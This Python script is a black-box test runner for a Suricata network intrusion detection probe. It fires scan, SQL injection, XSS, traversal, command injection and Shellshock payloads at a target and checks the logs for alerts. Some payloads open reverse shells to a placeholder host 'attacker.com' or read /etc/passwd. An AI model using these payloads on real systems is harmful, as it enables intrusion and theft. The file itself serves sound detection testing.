#!/usr/bin/env python3
"""
NIDS 探针黑盒测试运行器

测试 NIDS 探针对各类攻击的检测能力
"""

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional

# 测试结果
class TestResult:
    def __init__(self, name: str):
        self.name = name
        self.passed = False
        self.message = ""
        self.alerts = []
        self.duration = 0.0

    def __repr__(self):
        status = "PASS" if self.passed else "FAIL"
        return f"[{status}] {self.name}: {self.message}"


class NIDSTestRunner:
    """NIDS 测试运行器"""
    
    def __init__(self, target_ip: str, manager_host: str = "127.0.0.1", 
                 manager_port: int = 9010, eve_log: str = "/var/log/suricata/eve.json"):
        self.target_ip = target_ip
        self.manager_host = manager_host
        self.manager_port = manager_port
        self.eve_log = eve_log
        self.results: List[TestResult] = []
        self.start_time = None
        
    def log(self, msg: str):
        """打印日志"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        
    def run_command(self, cmd: List[str], timeout: int = 30) -> tuple:
        """运行命令并返回结果"""
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)

    def check_tool(self, tool: str) -> bool:
        """检查工具是否可用"""
        code, _, _ = self.run_command(["which", tool])
        return code == 0

    def get_alerts_since(self, since_time: datetime, wait_seconds: int = 5) -> List[Dict]:
        """获取指定时间之后的告警"""
        time.sleep(wait_seconds)  # 等待告警生成
        
        alerts = []
        if not os.path.exists(self.eve_log):
            return alerts
            
        try:
            with open(self.eve_log, 'r') as f:
                for line in f:
                    try:
                        event = json.loads(line.strip())
                        if event.get('event_type') == 'alert':
                            # 解析时间戳
                            ts = event.get('timestamp', '')
                            if ts:
                                event_time = datetime.fromisoformat(ts.replace('Z', '+00:00').split('+')[0])
                                if event_time >= since_time:
                                    alerts.append(event)
                    except json.JSONDecodeError:
                        continue
        except Exception as e:
            self.log(f"Error reading eve.json: {e}")
            
        return alerts

    def test_manager_connection(self) -> TestResult:
        """测试与 Manager 的连接"""
        result = TestResult("Manager Connection Test")
        start = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.manager_host, self.manager_port))
            
            # 发送测试消息
            msg = json.dumps({
                "event": "EVT_STATUS",
                "probe_type": "test",
                "probe_id": "test-probe",
                "data": {"test": True}
            }).encode()
            
            # 发送: 4字节长度 + 消息体
            sock.send(struct.pack('>I', len(msg)) + msg)
            
            # 尝试接收响应
            sock.settimeout(2)
            try:
                data = sock.recv(1024)
                result.message = f"Connected and received {len(data)} bytes"
            except socket.timeout:
                result.message = "Connected, no response (expected for status message)"
            
            sock.close()
            result.passed = True
            
        except socket.error as e:
            result.message = f"Connection failed: {e}"
            result.passed = False
            
        result.duration = time.time() - start
        return result

    def test_tcp_syn_scan(self) -> TestResult:
        """测试 TCP SYN 扫描检测"""
        result = TestResult("TCP SYN Scan Detection")
        start = time.time()
        
        if not self.check_tool("nmap"):
            result.message = "nmap not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        # 记录开始时间
        test_start = datetime.now()
        
        # 执行扫描
        self.log(f"Running TCP SYN scan on {self.target_ip}...")
        code, stdout, stderr = self.run_command([
            "nmap", "-sS", "-p", "22,80,443", "-T4", 
            "--max-retries", "1", self.target_ip
        ], timeout=60)
        
        if code != 0:
            result.message = f"Scan failed: {stderr}"
            result.passed = False
        else:
            # 检查是否产生告警
            alerts = self.get_alerts_since(test_start)
            scan_alerts = [a for a in alerts if 'SCAN' in a.get('alert', {}).get('signature', '').upper()]
            
            result.alerts = scan_alerts
            if scan_alerts:
                result.passed = True
                result.message = f"Detected {len(scan_alerts)} scan alerts"
            else:
                result.passed = False
                result.message = "No scan alerts detected (may need ET rules)"
        
        result.duration = time.time() - start
        return result

    def test_sql_injection(self) -> TestResult:
        """测试 SQL 注入检测"""
        result = TestResult("SQL Injection Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # SQL 注入测试 payload
        payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "1 UNION SELECT * FROM users",
            "admin'--",
            "1' AND 1=1--"
        ]
        
        self.log("Testing SQL injection payloads...")
        for payload in payloads:
            url = f"http://{self.target_ip}/?id={payload}"
            self.run_command(["curl", "-s", "-o", "/dev/null", "--max-time", "5", url])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        sql_alerts = [a for a in alerts if 'SQL' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = sql_alerts
        if sql_alerts:
            result.passed = True
            result.message = f"Detected {len(sql_alerts)} SQL injection alerts"
        else:
            result.passed = False
            result.message = "No SQL injection alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_xss_attack(self) -> TestResult:
        """测试 XSS 攻击检测"""
        result = TestResult("XSS Attack Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # XSS 测试 payload
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]
        
        self.log("Testing XSS payloads...")
        for payload in payloads:
            url = f"http://{self.target_ip}/search?q={payload}"
            self.run_command(["curl", "-s", "-o", "/dev/null", "--max-time", "5", url])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        xss_alerts = [a for a in alerts if 'XSS' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = xss_alerts
        if xss_alerts:
            result.passed = True
            result.message = f"Detected {len(xss_alerts)} XSS alerts"
        else:
            result.passed = False
            result.message = "No XSS alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_directory_traversal(self) -> TestResult:
        """测试目录遍历检测"""
        result = TestResult("Directory Traversal Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # 目录遍历 payload
        payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "/etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam"
        ]
        
        self.log("Testing directory traversal payloads...")
        for payload in payloads:
            url = f"http://{self.target_ip}/file?name={payload}"
            self.run_command(["curl", "-s", "-o", "/dev/null", "--max-time", "5", url])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        traversal_alerts = [a for a in alerts if 'TRAVERSAL' in a.get('alert', {}).get('signature', '').upper()
                          or 'DIRECTORY' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = traversal_alerts
        if traversal_alerts:
            result.passed = True
            result.message = f"Detected {len(traversal_alerts)} directory traversal alerts"
        else:
            result.passed = False
            result.message = "No directory traversal alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_command_injection(self) -> TestResult:
        """测试命令注入检测"""
        result = TestResult("Command Injection Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # 命令注入 payload
        payloads = [
            ";cat /etc/passwd",
            "|nc attacker.com 4444 -e /bin/sh",
            "`id`",
            "$(whoami)",
            "& ping -c 1 attacker.com"
        ]
        
        self.log("Testing command injection payloads...")
        for payload in payloads:
            url = f"http://{self.target_ip}/exec?cmd={payload}"
            self.run_command(["curl", "-s", "-o", "/dev/null", "--max-time", "5", url])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        cmd_alerts = [a for a in alerts if 'COMMAND' in a.get('alert', {}).get('signature', '').upper()
                     or 'CMD' in a.get('alert', {}).get('signature', '').upper()
                     or 'SHELL' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = cmd_alerts
        if cmd_alerts:
            result.passed = True
            result.message = f"Detected {len(cmd_alerts)} command injection alerts"
        else:
            result.passed = False
            result.message = "No command injection alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_malicious_user_agent(self) -> TestResult:
        """测试恶意 User-Agent 检测"""
        result = TestResult("Malicious User-Agent Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # 恶意 User-Agent
        user_agents = [
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            "Wget/1.12 (linux-gnu)",
            "curl/7.64.0",
            "sqlmap/1.4.7#stable",
            "Nikto/2.1.6"
        ]
        
        self.log("Testing malicious User-Agents...")
        for ua in user_agents:
            self.run_command([
                "curl", "-s", "-o", "/dev/null", "--max-time", "5",
                "-A", ua, f"http://{self.target_ip}/"
            ])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        ua_alerts = [a for a in alerts if 'USER-AGENT' in a.get('alert', {}).get('signature', '').upper()
                    or 'USER_AGENT' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = ua_alerts
        if ua_alerts:
            result.passed = True
            result.message = f"Detected {len(ua_alerts)} malicious User-Agent alerts"
        else:
            result.passed = False
            result.message = "No malicious User-Agent alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_shellshock(self) -> TestResult:
        """测试 Shellshock 漏洞检测"""
        result = TestResult("Shellshock Detection")
        start = time.time()
        
        if not self.check_tool("curl"):
            result.message = "curl not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        # Shellshock payload
        shellshock_headers = [
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",
            "() { :;}; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "() { :; }; echo Shellshock"
        ]
        
        self.log("Testing Shellshock payloads...")
        for header in shellshock_headers:
            self.run_command([
                "curl", "-s", "-o", "/dev/null", "--max-time", "5",
                "-H", f"User-Agent: {header}",
                f"http://{self.target_ip}/cgi-bin/test.cgi"
            ])
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        shellshock_alerts = [a for a in alerts if 'SHELLSHOCK' in a.get('alert', {}).get('signature', '').upper()
                           or 'BASH' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = shellshock_alerts
        if shellshock_alerts:
            result.passed = True
            result.message = f"Detected {len(shellshock_alerts)} Shellshock alerts"
        else:
            result.passed = False
            result.message = "No Shellshock alerts detected"
        
        result.duration = time.time() - start
        return result

    def test_icmp_ping(self) -> TestResult:
        """测试 ICMP 检测"""
        result = TestResult("ICMP Detection")
        start = time.time()
        
        if not self.check_tool("ping"):
            result.message = "ping not installed"
            result.passed = False
            result.duration = time.time() - start
            return result
        
        test_start = datetime.now()
        
        self.log(f"Sending ICMP ping to {self.target_ip}...")
        code, stdout, stderr = self.run_command([
            "ping", "-c", "5", self.target_ip
        ], timeout=30)
        
        # 检查告警
        alerts = self.get_alerts_since(test_start)
        icmp_alerts = [a for a in alerts if 'ICMP' in a.get('alert', {}).get('signature', '').upper()]
        
        result.alerts = icmp_alerts
        # ICMP 正常 ping 通常不会告警，除非有异常
        if code == 0:
            result.passed = True
            result.message = f"Ping successful, {len(icmp_alerts)} ICMP alerts"
        elif "Operation not permitted" in stderr or "permission" in stderr.lower():
            # 权限问题，跳过测试（不视为失败）
            result.passed = True
            result.message = "Skipped (requires root/CAP_NET_RAW)"
        else:
            result.passed = False
            result.message = f"Ping failed: {stderr}"
        
        result.duration = time.time() - start
        return result

    def run_all_tests(self, quick: bool = False) -> List[TestResult]:
        """运行所有测试"""
        self.log("=" * 60)
        self.log("NIDS Probe Blackbox Tests")
        self.log("=" * 60)
        self.log(f"Target: {self.target_ip}")
        self.log(f"Manager: {self.manager_host}:{self.manager_port}")
        self.log(f"EVE Log: {self.eve_log}")
        self.log("=" * 60)
        
        self.start_time = time.time()
        self.results = []
        
        # 基础测试
        tests = [
            self.test_manager_connection,
            self.test_icmp_ping,
        ]
        
        if not quick:
            # 完整测试
            tests.extend([
                self.test_tcp_syn_scan,
                self.test_sql_injection,
                self.test_xss_attack,
                self.test_directory_traversal,
                self.test_command_injection,
                self.test_malicious_user_agent,
                self.test_shellshock,
            ])
        
        for test_func in tests:
            self.log(f"\n>>> Running: {test_func.__name__}")
            try:
                result = test_func()
                self.results.append(result)
                self.log(str(result))
            except Exception as e:
                result = TestResult(test_func.__name__)
                result.passed = False
                result.message = f"Exception: {e}"
                self.results.append(result)
                self.log(f"[ERROR] {test_func.__name__}: {e}")
        
        return self.results

    def print_summary(self):
        """打印测试摘要"""
        total_time = time.time() - self.start_time
        passed = sum(1 for r in self.results if r.passed)
        failed = len(self.results) - passed
        
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        print(f"Total: {len(self.results)} | Passed: {passed} | Failed: {failed}")
        print(f"Duration: {total_time:.2f}s")
        print("-" * 60)
        
        for result in self.results:
            status = "✓" if result.passed else "✗"
            print(f"  {status} {result.name}: {result.message}")
            if result.alerts:
                print(f"    Alerts: {len(result.alerts)}")
        
        print("=" * 60)
        
        return failed == 0


def main():
    parser = argparse.ArgumentParser(description="NIDS Probe Blackbox Tests")
    parser.add_argument("--target", "-t", default="127.0.0.1",
                       help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--manager-host", default="127.0.0.1",
                       help="Probe Manager host (default: 127.0.0.1)")
    parser.add_argument("--manager-port", "-p", type=int, default=9010,
                       help="Probe Manager port (default: 9010)")
    parser.add_argument("--eve-log", default="/var/log/suricata/eve.json",
                       help="Suricata eve.json path")
    parser.add_argument("--quick", "-q", action="store_true",
                       help="Run quick tests only")
    parser.add_argument("--json", action="store_true",
                       help="Output results as JSON")
    
    args = parser.parse_args()
    
    runner = NIDSTestRunner(
        target_ip=args.target,
        manager_host=args.manager_host,
        manager_port=args.manager_port,
        eve_log=args.eve_log
    )
    
    results = runner.run_all_tests(quick=args.quick)
    
    if args.json:
        output = {
            "target": args.target,
            "results": [
                {
                    "name": r.name,
                    "passed": r.passed,
                    "message": r.message,
                    "duration": r.duration,
                    "alert_count": len(r.alerts)
                }
                for r in results
            ]
        }
        print(json.dumps(output, indent=2))
    else:
        success = runner.print_summary()
        sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
